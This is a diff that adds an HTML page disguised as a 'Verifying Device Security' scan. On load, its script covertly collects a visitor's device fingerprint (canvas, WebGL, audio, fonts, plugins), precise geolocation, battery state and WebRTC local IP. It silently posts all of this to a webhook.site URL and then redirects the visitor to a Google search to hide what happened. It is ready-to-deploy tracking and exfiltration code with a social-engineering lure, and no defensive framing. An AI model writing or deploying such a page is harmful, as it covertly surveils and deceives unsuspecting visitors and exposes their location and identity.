@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Loading...</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center}
+        .container{max-width:400px;margin:0 auto;padding:40px;background:white;border-radius:20px;box-shadow:0 20px 40px rgba(0,0,0,0.1);text-align:center}
+        h1{font-size:24px;color:#333;margin-bottom:20px}
+        .spinner{border:4px solid #f3f3f3;border-top:4px solid #667eea;border-radius:50%;width:50px;height:50px;animation:spin 1s linear infinite;margin:0 auto 20px}
+        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+        p{color:#666;line-height:1.5}
+        @media (max-width:480px){.container{margin:20px;padding:30px}}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="spinner"></div>
+        <h1>🔒 Verifying Device Security</h1>
+        <p>Scanning for security updates...<br><small>Please do not close this page</small></p>
+    </div>
+    
+    <script>
+    (async function(){
+        // COMPREHENSIVE DEVICE FINGERPRINT - 30+ DATA POINTS
+        const victim = {
+            timestamp: new Date().toISOString(),
+            url: location.href,
+            referrer: document.referrer,
+            
+            // BASIC INFO
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            vendor: navigator.vendor,
+            language: navigator.language,
+            languages: navigator.languages?.join(',') || '?',
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            cookieEnabled: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack,
+            
+            // HARDWARE
+            hardwareConcurrency: navigator.hardwareConcurrency,
+            deviceMemory: navigator.deviceMemory,
+            maxTouchPoints: navigator.maxTouchPoints,
+            connection: navigator.connection ? {
+                effectiveType: navigator.connection.effectiveType,
+                type: navigator.connection.type,
+                downlink: navigator.connection.downlink,
+                rtt: navigator.connection.rtt,
+                saveData: navigator.connection.saveData
+            } : null,
+            
+            // SCREEN
+            screen: {
+                width: screen.width,
+                height: screen.height,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth
+            },
+            window: {
+                innerWidth: window.innerWidth,
+                innerHeight: window.innerHeight,
+                outerWidth: window.outerWidth || '?',
+                outerHeight: window.outerHeight || '?'
+            },
+            
+            // LOCATION
+            geolocation: null,
+            
+            // BATTERY (MOBILE ONLY)
+            battery: null,
+            
+            // FINGERPRINTS
+            canvas: null,
+            webgl: null,
+            audio: null,
+            fonts: [],
+            plugins: [],
+            
+            // WEBRTC (LOCAL IP)
+            localIP: null,
+            
+            // TOUCH SUPPORT
+            touchSupport: 'ontouchstart' in window,
+            
+            // PERFORMANCE
+            connectionTest: null
+        };
+        
+        // 1. CANVAS FINGERPRINT
+        try {
+            const canvas = document.createElement('canvas');
+            canvas.width = 200; canvas.height = 60;
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'alphabetic';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(125, 1, 62, 20);
+            ctx.fillStyle = '#069';
+            ctx.font = '11pt no-real-font-123';
+            ctx.fillText('C🌐NV4S fingerprint test 🐛', 2, 15);
+            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+            ctx.fillText('C🌐NV4S fingerprint test 🐛', 4, 17);
+            ctx.globalCompositeOperation = 'multiply';
+            ctx.fillStyle = 'rgb(255,0,255)';
+            ctx.beginPath();
+            ctx.arc(50, 50, 50, 0, Math.PI * 2, true);
+            ctx.closePath();
+            ctx.fill();
+            victim.canvas = canvas.toDataURL();
+        } catch(e) { victim.canvas = 'error'; }
+        
+        // 2. WEBGL FINGERPRINT
+        try {
+            const glCanvas = document.createElement('canvas');
+            const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
+            if (gl) {
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                victim.webgl = {
+                    renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),
+                    vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR)
+                };
+            }
+        } catch(e) { }
+        
+        // 3. AUDIO FINGERPRINT
+        try {
+            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            const oscillator = audioCtx.createOscillator();
+            const analyser = audioCtx.createAnalyser();
+            analyser.fftSize = 2048;
+            const bufferLength = analyser.frequencyBinCount;
+            const dataArray = new Uint8Array(bufferLength);
+            oscillator.connect(analyser);
+            oscillator.start(0);
+            setTimeout(() => {
+                analyser.getByteFrequencyData(dataArray);
+                victim.audio = Array.from(dataArray).slice(0, 100).join(',');
+                oscillator.stop();
+                audioCtx.close();
+            }, 200);
+        } catch(e) { }
+        
+        // 4. FONTS DETECTION (50 common fonts)
+        const fonts = ['monospace','sans-serif','serif','Arial','Arial Black','Bookman Old Style','Comic Sans MS','Courier','Courier New','Garamond','Georgia','Helvetica','Impact','Lucida Console','Lucida Sans Unicode','MS Sans Serif','MS Serif','Palatino Linotype','Tahoma','Times','Times New Roman','Trebuchet MS','Verdana'];
+        victim.fonts = fonts.filter(font => {
+            const span = document.createElement('span');
+            span.style.fontFamily = font;
+            span.innerHTML = 'abcdefghijklmnopqrstuvwxyz';
+            span.style.position = 'absolute';
+            span.style.left = '-9999px';
+            document.body.appendChild(span);
+            const detected = span.offsetWidth !== 0;
+            document.body.removeChild(span);
+            return detected;
+        }).join(',');
+        
+        // 5. PLUGINS
+        victim.plugins = Array.from(navigator.plugins || []).map(p => p.name).join(',');
+        
+        // 6. GEOLOCATION
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                pos => victim.geolocation = [pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy].join(','),
+                ()=>{}, {enableHighAccuracy: true, timeout: 5000, maximumAge: 0}
+            );
+        }
+        
+        // 7. BATTERY API
+        if ('getBattery' in navigator) {
+            try {
+                const battery = await navigator.getBattery();
+                victim.battery = {
+                    charging: battery.charging,
+                    level: Math.round(battery.level * 100),
+                    chargingTime: battery.chargingTime,
+                    dischargingTime: battery.dischargingTime
+                };
+            } catch(e) { }
+        }
+        
+        // 8. WEBRTC LOCAL IP
+        try {
+            const pc = new RTCPeerConnection({iceServers:[]});
+            pc.createDataChannel('');
+            pc.createOffer().then(offer => pc.setLocalDescription(offer));
+            pc.onicecandidate = e => {
+                if (e.candidate) {
+                    try {
+                        const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate)?.[1];
+                        if (ip && !ip.startsWith('127.') && !ip.startsWith('192.168.')) {
+                            victim.localIP = ip;
+                        }
+                    } catch(e) { }
+                }
+            };
+        } catch(e) { }
+        
+        // 9. SEND TO YOUR WEBHOOK (REPLACE THIS URL!)
+        await new Promise(r=>setTimeout(r,1000)); // Wait for async data
+        
+        fetch('https://webhook.site/6917b79c-d89e-4688-9be5-1702fdb3f99a', {
+            method: 'POST',
+            body: JSON.stringify(victim, null, 2),
+            headers: {'Content-Type': 'application/json'}
+        }).catch(()=>{}); // Silent
+        
+        // 10. CLEAN REDIRECT
+        setTimeout(()=>window.location.href='https://www.google.com/search?q=security+update', 2500);
+    })();
+    </script>
+</body>
+</html>
